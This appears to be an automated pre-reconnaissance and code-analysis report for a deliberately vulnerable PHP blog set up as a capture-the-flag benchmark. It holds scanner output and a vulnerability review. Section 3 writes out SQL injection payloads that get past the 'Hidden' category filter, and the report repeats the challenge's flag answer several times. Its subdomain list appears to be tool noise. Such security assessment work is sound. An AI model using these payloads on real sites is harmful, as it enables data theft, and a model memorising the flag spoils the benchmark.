# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-28 13:34 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000038s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.4
9999/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
49158/tcp open  http      Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 20:34:33 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 20:34:18 GMT
|     Content-Length: 14
|_    auth required
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port49158-TCP:V=7.97%I=7%D=10/28%Time=690128CA%P=arm-apple-darwin24.4.0
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\n
SF:Content-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x
SF:20'none';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20scr
SF:ipt-src-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nTailscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-
SF:gec2eb9730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x2
SF:0DENY\r\nDate:\x20Tue,\x2028\x20Oct\x202025\x2020:34:18\x20GMT\r\nConte
SF:nt-Length:\x2014\r\n\r\nauth\x20required\n")%r(HTTPOptions,192,"HTTP/1\
SF:.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-src\x2
SF:0'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20scri
SF:pt-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale-Ver
SF:sion:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x20202
SF:5\x2020:34:18\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20required\n
SF:")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,192,"HTT
SF:P/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20
SF:script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale
SF:-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\
SF:x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x2
SF:02025\x2020:34:33\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requir
SF:ed\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.39 seconds


## Subdomain Discovery (subfinder)
Status: success
www.localhost
autodiscover.localhost
autodiscover.regency.localhost
sbs.allsaintsschool.localhost
exchvm.nwcnet.localhost
naeu2.naeuinc.localhost
mail.localhost
mail.regency.localhost
server2.hunter.localhost
server02.counterintel.localhost
mse-ca-mail.corp.mse.localhost
mail03.regency.localhost
owa.regency.localhost
tools.sonoma.edu.localhost
fndlync01.5ninesdata.localhost
mail02.regency.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:33363[0m [200 OK] [1mApache[0m[[1m[32m2.4.54[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.54 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPHP[0m[[1m[32m7.4.33[0m], [1mTitle[0m[[1m[33mBlog Home[0m], [1mX-Powered-By[0m[[0m[22mPHP/7.4.33[0m]

## Code Analysis
# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported below meet the "In-Scope" criteria defined in this section.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`)
- A development environment's internal tooling (e.g., a "run script" button in an IDE)
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions)
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts that require manual opening in a browser (not served by the application)

### Application Context: XBEN-083-24 CTF Challenge

This is a deliberately vulnerable PHP blog application designed as a Capture The Flag (CTF) challenge. The flag value is `flag{7b228415-018a-4446-ad84-66153396e7c6}`, stored in the database within a hidden post (category="Hidden", published=0). The application's security posture reflects intentional vulnerabilities for educational purposes and penetration testing practice.

---

## 1. Executive Summary

The XBEN-083-24 application is a minimalistic PHP blog running on Apache 2.4 with MySQL 5.7 backend, deployed via Docker Compose. This is a traditional LAMP stack monolith consisting of a single 71-line PHP file (`index.php`) with no authentication, authorization, or modern security controls. The application is designed as a CTF challenge focused on SQL injection exploitation.

**Critical Security Assessment:** The application exhibits a **CRITICALLY INSECURE** security posture with multiple high-severity vulnerabilities. The primary attack vector is SQL injection in the category filtering parameter, which enables complete database compromise, including retrieval of the hidden CTF flag. The application uses end-of-life software (PHP 7.4 and MySQL 5.7), MD5 password hashing, hardcoded credentials, and lacks fundamental security controls including input validation, output encoding, HTTPS/TLS, CSRF protection, and security headers.

**Key Attack Surfaces:** The application exposes a single dynamic HTTP endpoint (`GET /index.php`) that accepts user input via the `category` GET parameter. This parameter is directly concatenated into SQL queries without sanitization or parameterization, creating a trivial SQL injection vulnerability. Additionally, database content is rendered in HTML without output encoding, enabling stored and reflected XSS attacks. The combination of these vulnerabilities allows an external attacker to bypass the application's weak access controls (a blocklist filter for "Hidden" category) and extract sensitive data including the CTF flag, admin credentials, and all database contents.

**Architectural Risk Factors:** The application runs over unencrypted HTTP (port 80 only), exposes detailed error messages to end users, uses cryptographically broken MD5 for password hashing, and hardcodes database credentials directly in source code. There is no session management, no authentication mechanism, and no authorization framework despite an `admins` table existing in the database. All content is publicly accessible without any access controls beyond a simple string comparison that checks if the category equals "Hidden" - a filter easily bypassed via SQL injection.

---

## 2. Architecture & Technology Stack

**Framework & Language:** The application is built with **PHP 7.4** (released November 2019, reached end-of-life November 2022) running as mod_php under Apache 2.4. No PHP framework is used - this is raw procedural PHP with direct SQL queries using the `mysqli` extension. PHP 7.4 no longer receives security updates, exposing the application to known CVEs that will never be patched. The PHP configuration (`Dockerfile:9-13`) dangerously enables `display_errors = On` and `display_startup_errors = On` in production, leaking internal file paths, database structure, and sensitive debugging information to end users.

The application uses **MySQL 5.7** (released March 2013, reached end-of-life October 2023) for data persistence. Database credentials are hardcoded as `user:password` with root credentials `root:rootpassword` - trivially weak passwords that would be compromised in seconds by automated scanning tools. The MySQL configuration uses the older `mysql_native_password` authentication plugin rather than the more secure `caching_sha2_password` default in MySQL 8.0+. Connection strings are embedded directly in application code (`index.php:2`) rather than using environment variables, violating twelve-factor app principles and making credential rotation impossible without code changes.

**Security Implications:** The technology stack represents a security disaster from multiple perspectives. Both PHP 7.4 and MySQL 5.7 are end-of-life software with no security patches available. The PHP configuration exposes detailed error messages including SQL syntax errors that reveal table structure, column names, and query logic to attackers. The lack of any framework means no built-in security features like CSRF protection, XSS auto-escaping, SQL injection prevention, or input validation. Every security control must be manually implemented, and in this application, none have been. The mysqli extension is used correctly for database connectivity, but the application never uses prepared statements or parameterized queries, negating all SQL injection protections the extension provides.

**Architectural Pattern:** This is a classic **monolithic 2-tier architecture** with a single presentation/application layer (PHP) directly connected to a data layer (MySQL). There is no business logic layer, no service layer, no API gateway, no load balancer, and no architectural separation of concerns. The entire application exists in one 71-line file (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`) that handles database connections, query construction, HTML rendering, and all business logic. This pattern was common in early 2000s web development but is now considered an anti-pattern due to lack of modularity, testability, and security boundaries.

**Trust Boundaries:** There are no meaningful trust boundaries in this architecture. The web tier and data tier exist in separate Docker containers but share a Docker network with unrestricted communication. User input from HTTP requests flows directly into SQL queries with zero validation, sanitization, or authorization checks. Database output flows directly into HTML rendering with zero encoding or sanitization. The Apache web server has `Require all granted` permissions (`000-default.conf:11`) and `Options Indexes` enabled (`000-default.conf:10`), allowing directory listing and unrestricted access to all files.

**Critical Security Components:** The application completely lacks security components. There is no authentication middleware, no authorization framework, no input validation library, no output encoding helpers, no CSRF token generation, no security headers middleware, no rate limiting, and no logging or monitoring beyond basic Apache access logs. An `admins` table exists in the database with username and MD5-hashed password fields, but no login interface or authentication mechanism references this table. This suggests incomplete development or deliberate removal of authentication features for the CTF challenge.

---

## 3. Authentication & Authorization Deep Dive

**Authentication Mechanisms:** The application has **NO authentication mechanisms implemented**. There are no login endpoints, no logout endpoints, no registration endpoints, no password reset functionality, no session management, no cookie-based authentication, no JWT tokens, no OAuth flows, no API keys, and no HTTP Basic/Digest authentication. The entire application is publicly accessible without any identity verification. Every HTTP request is processed with full privileges regardless of the requester's identity.

Despite the absence of authentication, the database schema includes an `admins` table (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql:26-30`) with fields for `username` and `password`. This table contains one record: username `admin` with password `admin123` hashed using MD5. The MD5 hash of "admin123" is `0192023a7bbd73250516f069df18b500`, which is trivially searchable in rainbow table databases or crackable in milliseconds with modern GPUs. However, this admin account is never validated or used anywhere in the application code. No `SELECT` query references the `admins` table, and no login interface exists to submit credentials. This suggests the table is either vestigial code from a removed authentication system or a red herring in the CTF challenge design.

**Critical Authentication Vulnerability - Weak Password Hashing:** While authentication is not implemented, the presence of MD5 password hashing in the database schema (`db_init.sql:56`) represents a critical vulnerability if this code were ever activated. MD5 has been cryptographically broken since 2004, when collision attacks were first demonstrated. It is not designed for password hashing due to its speed (billions of hashes per second on modern hardware) and lack of salt. The application code `INSERT INTO admins (username, password) VALUES ('admin', MD5('admin123'))` creates an unsalted MD5 hash vulnerable to rainbow table attacks. Modern PHP provides the `password_hash()` function with `PASSWORD_ARGON2ID` or `PASSWORD_BCRYPT` algorithms that include automatic salting, adaptive cost factors, and resistance to GPU-based cracking. The use of MD5 in 2024 is professionally negligent and violates OWASP password storage guidelines.

**Session Management:** The application has **NO session management**. There are no `session_start()` calls in the PHP code, no session cookie configuration, and no session storage mechanism. PHP session cookies would typically include security flags like `HttpOnly` (prevents JavaScript access to prevent XSS-based session theft), `Secure` (ensures cookies only transmit over HTTPS), and `SameSite=Strict` (prevents CSRF attacks). None of these protections exist because sessions are not implemented. The application is completely stateless - each HTTP request is processed independently with no concept of user identity, session state, or authentication status.

**Session Cookie Security Flags:** Not applicable - no session cookies are set. If sessions were implemented, the exact file location for cookie configuration would typically be in PHP initialization code or a dedicated session configuration file. Modern PHP applications should configure: `session.cookie_httponly = 1`, `session.cookie_secure = 1`, `session.cookie_samesite = "Strict"`, and `session.cookie_lifetime = 3600` (1 hour). The absence of these configurations cannot be pinpointed to a specific file because session management is entirely absent from the codebase.

**Authorization Model:** The application has **NO authorization model**. There is no Role-Based Access Control (RBAC), no Attribute-Based Access Control (ABAC), no Access Control Lists (ACLs), no permission checks, and no role definitions. Every HTTP request has full read access to all published blog posts (`published = 1`). The database contains unpublished posts (`published = 0`) including the CTF flag, which should be administratively restricted, but the only "authorization" is a weak string comparison on lines 41-42 of `index.php`: `if ($category == "Hidden") $category = "";`. This attempts to prevent users from querying the "Hidden" category where the flag is stored.

**Authorization Bypass Vulnerability:** The "Hidden" category filter is **trivially bypassable** via SQL injection. The filter checks if the user-supplied `$category` variable exactly equals the string "Hidden" and resets it to empty string if true. However, this check occurs after the user input is captured (`$category = isset($_GET['category']) ? $_GET['category'] : '';` on line 37) but before the SQL query is constructed. An attacker can bypass this filter using SQL injection payloads that don't match "Hidden" as a string but achieve the same result in SQL context. For example: `?category=' OR category='Hidden'--` or `?category=Hidden' OR '1'='1` or `?category=' UNION SELECT * FROM posts WHERE category='Hidden'--`. The authorization logic is implemented at the application layer (PHP string comparison) but the vulnerability exists at the database layer (SQL injection), allowing complete bypass of access controls.

**Multi-tenancy Security:** Not applicable - this is a single-tenant application with no concept of tenant isolation, user accounts, or data segregation. All data is globally accessible to all HTTP requests.

**SSO/OAuth/OIDC Flows:** The application has **NO Single Sign-On (SSO), OAuth, or OpenID Connect (OIDC) integration**. There are no OAuth callback endpoints, no state parameter validation, no nonce validation, no token exchange mechanisms, and no third-party authentication provider integrations. Modern web applications often delegate authentication to identity providers like Auth0, Okta, Google, or GitHub using OAuth 2.0/OIDC protocols, but this application uses no such patterns.

**API Endpoints Used for Authentication:** **NONE - No authentication endpoints exist.** A production application would typically implement the following endpoints with security controls: `POST /api/auth/login` (credential validation), `POST /api/auth/logout` (session termination), `POST /api/auth/register` (account creation), `POST /api/auth/refresh` (token refresh), `POST /api/auth/reset-password` (password reset initiation), and `GET /api/auth/verify` (token/session validation). None of these exist in this application. The only network-accessible endpoint is `GET /index.php` (or `GET /` via Apache rewriting) which displays blog posts.

---

## 4. Data Security & Storage

**Database Security Analysis:** The MySQL 5.7 database is configured with critical security weaknesses. Database credentials are hardcoded in multiple locations: PHP application code (`index.php:2`), Docker Compose environment variables (`docker-compose.yml:13-15, 26-29`), and likely Docker image layers. The root password is `rootpassword` and the application user password is `password` - both appear in common password dictionaries and would be compromised in seconds by automated scanners. The database connection uses hostname `db` (Docker service name) on port 3306 with no SSL/TLS encryption. All SQL queries, results, and credentials transit the Docker network in plaintext, vulnerable to container escape or network sniffing attacks.

The database schema (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql`) defines three tables: `posts`, `comments`, and `admins`. The `posts` table stores blog content including the CTF flag in a record with `category='Hidden'` and `published=0`. The `admins` table stores credentials using MD5 hashing without salt. None of the tables implement row-level security, encryption at rest, or audit logging. The database lacks foreign key constraints on the `comments.post_id` field despite being defined as a foreign key relationship, though this is a data integrity issue rather than security vulnerability. No database user privileges are restricted - the application user account has full read/write access to all tables.

**Encryption at Rest:** **NOT IMPLEMENTED.** MySQL 5.7 supports InnoDB tablespace encryption via the `encryption='Y'` option, but the schema files contain no encryption directives. All table data, including the CTF flag (`flag{7b228415-018a-4446-ad84-66153396e7c6}`), admin credentials, and blog content, are stored as plaintext in filesystem files within the Docker container at `/var/lib/mysql/`. If the Docker volume were extracted or the container filesystem compromised, all data would be immediately readable without decryption. Modern database deployments should use encryption at rest (filesystem-level or database-level) and transparent data encryption (TDE) for sensitive columns.

**Encryption in Transit:** **NOT IMPLEMENTED.** The MySQL connection between PHP and database uses unencrypted TCP (`mysqli('db', 'user', 'password', 'blogDB')` on `index.php:2`). The mysqli extension supports SSL/TLS connections via `mysqli_ssl_set()` or connection options, but this is never invoked. All SQL queries, query results, and authentication handshakes transmit in plaintext over the Docker network bridge. Additionally, the web application serves HTTP on port 80 only (`docker-compose.yml:9` maps port 80, and `000-default.conf:1` configures `<VirtualHost *:80>`). There is no HTTPS configuration, no SSL certificate, no TLS termination, and no redirect from HTTP to HTTPS. All user requests, HTML responses, SQL injection payloads, and XSS attacks transmit in cleartext, vulnerable to network interception.

**Data Flow Security:** The application has a direct, unprotected data flow: `HTTP Request → PHP → MySQL → PHP → HTTP Response`. User input enters via `$_GET['category']` on line 37 of `index.php` with zero validation, sanitization, or type checking. This input is directly concatenated into a SQL query on line 45: `$sql .= "and category = '" . $category . "' ";`. The query executes against MySQL and returns rows as an associative array. These rows are then directly echoed into HTML on lines 57-62 without any output encoding: `echo "<div class='post'><h2>{$row['title']}</h2>..."`. This creates a complete data flow vulnerability from input to output with no security controls at any layer.

**Sensitive Data Inventory:** The database contains multiple categories of sensitive data. The `posts` table includes a record with `content='<FLAG>flag{7b228415-018a-4446-ad84-66153396e7c6}</FLAG>'` (after Docker build-time substitution) stored with `published=0` and `category='Hidden'`. This is the CTF challenge objective. The `admins` table contains username `admin` and password hash `0192023a7bbd73250516f069df18b500` (MD5 of "admin123"), which qualifies as sensitive authentication credentials despite being unused. The `.env` file in the repository root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/.env:1`) contains `FLAG="flag{7b228415-018a-4446-ad84-66153396e7c6}"` in plaintext, exposing the CTF solution without exploitation if an attacker gains filesystem access.

**Secret Management:** **CRITICALLY INSECURE.** Secrets are stored in plaintext across multiple locations: (1) Database credentials hardcoded in PHP source code (`index.php:2`), (2) Database passwords in Docker Compose YAML (`docker-compose.yml:14-15, 28-29`), (3) CTF flag in `.env` file committed to version control (`/.env:1`), (4) Flag embedded in database initialization script (`db_init.sql:53`) before Docker build substitution, (5) Flag passed as Docker build argument (`Dockerfile:20-21`) visible in image layer history. Modern applications should use secret management systems like HashiCorp Vault, AWS Secrets Manager, or Kubernetes Secrets with encrypted storage, automatic rotation, and access auditing. Environment variables should be injected at runtime, never committed to version control. Database credentials should use short-lived tokens or certificate-based authentication.

**Multi-tenant Data Isolation:** Not applicable - this is a single-tenant application with no concept of multiple organizations, users, or data segregation boundaries.

**Compliance Considerations:** The application violates multiple regulatory compliance frameworks. For **GDPR (General Data Protection Regulation)**, the application has no consent mechanisms, no privacy policy, no data subject access request (DSAR) handling, no right-to-erasure implementation, and no encryption of personal data. If this stored EU user data, it would face fines up to 4% of global revenue. For **PCI-DSS (Payment Card Industry Data Security Standard)**, not applicable as no payment data is processed, but the weak encryption and insecure transmission would fail requirements 3 (protect stored cardholder data) and 4 (encrypt transmission of cardholder data). For **SOC 2 (System and Organization Controls)**, the application fails all five trust service criteria: Security (no access controls), Availability (no redundancy), Processing Integrity (no input validation), Confidentiality (no encryption), and Privacy (no privacy controls). The application would fail any professional security audit.

---

## 5. Attack Surface Analysis

**External Entry Points - Primary Web Endpoint:** The application exposes one dynamic HTTP endpoint: `GET /` (served by `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`). This endpoint accepts zero or one GET parameters: `category` (optional). The endpoint is **PUBLIC** - no authentication required, no rate limiting, no geographic restrictions, no IP allowlisting. Any internet-connected host can submit unlimited requests. The endpoint queries the MySQL database for blog posts matching `published=1` and optionally filtering by category. It returns an HTML page with a dropdown menu populated by distinct category values from the database and a list of matching blog posts with title, category, image, and content preview.

**Input Attack Surface:** The `category` parameter on line 37 (`$category = isset($_GET['category']) ? $_GET['category'] : '';`) accepts any string value with no length limits, character restrictions, or validation. The parameter is vulnerable to SQL injection (line 45), reflected XSS (line 29 in the dropdown), and application logic bypass (lines 41-42). An attacker can submit category values containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`, `*/`), JavaScript (`<script>`, `onerror=`, `onclick=`), and other malicious payloads. The only "validation" is a simple string equality check for "Hidden" that can be bypassed as described in Section 3. Maximum parameter length is unlimited - PHP's default `max_input_vars=1000` and `post_max_size=8M` are irrelevant for GET parameters which are limited only by web server configuration (Apache default is 8KB for query strings).

**Static Resource Attack Surface:** The application serves two static CSS and image resources: (1) `GET /styles.css` (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/styles.css`) - 28 lines of CSS with no embedded JavaScript or security implications, (2) `GET /images/morning-dew.jpg` (273KB JPEG image), (3) `GET /images/sunset.jpg` (226KB JPEG image). These are served directly by Apache without PHP processing. The images are referenced in the database as filenames only (`'morning-dew.jpg'`), not URLs, so there is no image upload functionality or arbitrary file serving. Directory listing is enabled (`Options Indexes` in `000-default.conf:10`), so an attacker can enumerate all files in `/var/www/html/` by requesting directories without index files.

**Internal Service Communication:** The web container communicates with the database container over Docker's bridge network (service name `db`, port 3306). This is an internal trust boundary - the database port is not exposed to the host or internet (`docker-compose.yml:22-31` has no `ports:` directive for the db service). However, if the web container is compromised via SQL injection or code execution vulnerabilities, an attacker gains full access to the database without additional authentication challenges. The database trusts all connections from the web container. There is no network segmentation, no firewall rules, no mTLS authentication, and no network policies restricting communication.

**Background Processing:** The application has no background job processing, no message queues, no cron jobs, and no async workers. The only processing occurs synchronously during HTTP request handling. The Docker Compose configuration includes a health check for the web service (`healthcheck: test: ["CMD", "curl", "-f", "http://127.0.0.1:80/"]` on `docker-compose.yml:16-19`) that requests the index page every 30 seconds, but this is internal health monitoring, not a user-facing attack surface.

**Input Validation Patterns:** **NONE IMPLEMENTED.** The application performs zero input validation. The `$category` parameter is used directly after checking `isset()` (which only verifies the parameter exists, not its content). There are no calls to `filter_var()`, `filter_input()`, `htmlspecialchars()`, `htmlentities()`, `mysqli_real_escape_string()`, or any validation functions. There are no whitelist checks, no regex patterns, no type casting, and no length restrictions. Modern PHP applications should use filter functions like `filter_input(INPUT_GET, 'category', FILTER_SANITIZE_STRING)` at minimum, but best practice is framework-level input validation with strong typing and schema validation.

**Output Encoding Patterns:** **NONE IMPLEMENTED.** Database values are directly echoed into HTML on lines 57-62 without any encoding: `echo "<div class='post'><h2>{$row['title']}</h2>..."`. This creates XSS vulnerabilities in multiple contexts: HTML body (title, content), HTML attributes (image alt text, dropdown value), and potential JavaScript contexts if the content contained script tags. Modern PHP should wrap all user-controlled output in `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` to convert `<`, `>`, `"`, `'`, and `&` to HTML entities. Templating engines like Twig provide automatic escaping by default, but this application uses raw PHP echo statements with no escaping.

**File Upload Attack Surface:** **NOT PRESENT.** The application has no file upload functionality, no `$_FILES` handling, no `move_uploaded_file()` calls, and no multipart form processing. Images are stored with filenames only (`morning-dew.jpg`) and served statically by Apache from a fixed directory. There is no user-controlled file path manipulation or upload-based attack surface.

**API Attack Surface:** **NOT PRESENT.** This is not a REST API, GraphQL API, or RPC service. It is a traditional server-rendered HTML application. There are no JSON/XML endpoints, no API authentication mechanisms, no rate limiting, and no API versioning. All responses are HTML with `Content-Type: text/html`.

---

## 6. Infrastructure & Operational Security

**Secrets Management:** Secrets are managed insecurely across multiple locations in plaintext. The CTF flag value `flag{7b228415-018a-4446-ad84-66153396e7c6}` appears in: (1) `.env` file at repository root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/.env:1`) as `FLAG="flag{7b228415-018a-4446-ad84-66153396e7c6}"`, (2) `db_init.sql:53` as `<FLAG>@FLAG@</FLAG>` (template substituted during Docker build), (3) Docker image layers as a build argument (`Dockerfile:20-21` uses `ARG FLAG` and `RUN sed -i s/@FLAG@/$FLAG/g`), which persists in image history via `docker history` command. Database credentials appear in: (1) `index.php:2` as hardcoded string `new mysqli('db', 'user', 'password', 'blogDB')`, (2) `docker-compose.yml:13-15, 28-29` as environment variables in cleartext. These secrets have no rotation mechanism, no expiration, and no access auditing. Modern secret management should use dedicated secret stores (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) with encrypted storage, automatic rotation, audit trails, and just-in-time access.

**Configuration Security:** The application uses environment-based configuration but implements it insecurely. The `docker-compose.yml` defines environment variables for database connection details (`MYSQL_HOST=db`, `MYSQL_USER=user`, `MYSQL_PASSWORD=password`, `MYSQL_DATABASE=blogDB`) on lines 11-15, but the PHP application ignores these environment variables and uses hardcoded values instead. This means changing environment variables requires code changes, violating twelve-factor app principles. The PHP configuration is defined in the Dockerfile (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile:9-13`) with dangerous production settings: `display_errors = On`, `display_startup_errors = On`, and `error_reporting = E_ALL`. These configurations expose sensitive debugging information to end users, revealing file paths like `/var/www/html/index.php`, SQL query syntax, and database schema details in error messages. Production PHP should have `display_errors = Off` with `log_errors = On` to `error_log = /var/log/php/error.log`.

**Infrastructure Configuration Files:** The Docker Compose configuration (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/docker-compose.yml`) exposes the web service on port 80 only (line 9: `"80:80"`), with HTTP protocol explicitly configured in Apache (`000-default.conf:1` defines `<VirtualHost *:80>`). There is no TLS certificate, no HTTPS listener on port 443, and no HTTP-to-HTTPS redirect. Modern deployments should terminate TLS at a reverse proxy (Nginx, HAProxy, AWS ALB) or configure Apache with mod_ssl and Let's Encrypt certificates. The database service exposes port 3306 internally to the Docker network but not to the host (no `ports:` directive), providing minimal isolation if the web container is compromised.

**Security Headers Configuration:** **NOT CONFIGURED.** The Apache configuration (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf`) spans lines 1-24 and contains zero security header directives. Critical missing headers include:

- **Strict-Transport-Security (HSTS):** Not configured. This header instructs browsers to only connect via HTTPS for a specified duration. Without HSTS, users can be downgraded to HTTP and intercepted. Apache configuration should include: `Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"`. **File location for implementation:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` (add after line 11).

- **Content-Security-Policy (CSP):** Not configured. CSP prevents XSS attacks by restricting resource loading sources. A basic policy should be: `Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';"`. **File location for implementation:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` (add after line 11).

- **X-Frame-Options:** Not configured. This header prevents clickjacking attacks by controlling whether the page can be embedded in frames. Should be: `Header always set X-Frame-Options "DENY"`. **File location for implementation:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` (add after line 11).

- **X-Content-Type-Options:** Not configured. Prevents MIME sniffing attacks. Should be: `Header always set X-Content-Type-Options "nosniff"`. **File location for implementation:** Same as above.

- **Cache-Control:** Not configured. Sensitive pages should not be cached. Should be: `Header always set Cache-Control "no-store, no-cache, must-revalidate, proxy-revalidate"`. **File location for implementation:** Same as above.

No security headers are set in PHP code either - there are no `header()` function calls in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`. All security header implementation would need to be added to the Apache VirtualHost configuration file at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf`.

**External Dependencies:** The application has minimal external dependencies. PHP dependencies are managed through the base Docker image `php:7.4-apache` (from Docker Hub), which includes Apache 2.4, PHP 7.4, and standard PHP extensions. The `mysqli` extension is the only explicitly installed PHP dependency. MySQL dependencies are managed through the `mysql:5.7` Docker image. There is no `composer.json` for PHP package management, no `package.json` for Node.js dependencies, and no third-party libraries or frameworks. This minimal dependency footprint reduces supply chain attack surface but also means no security libraries (input validation, CSRF protection, etc.) are available. The application relies entirely on manual security implementation, which is completely absent.

**Third-Party Service Integrations:** **NONE.** The application has no external API integrations, no webhook subscriptions, no payment processors, no email services, no CDN usage, no analytics platforms, and no third-party authentication providers. All functionality is self-contained within the Docker Compose stack. This eliminates third-party security risks but also means no external security controls like WAF (Web Application Firewall), DDoS protection, or managed authentication services.

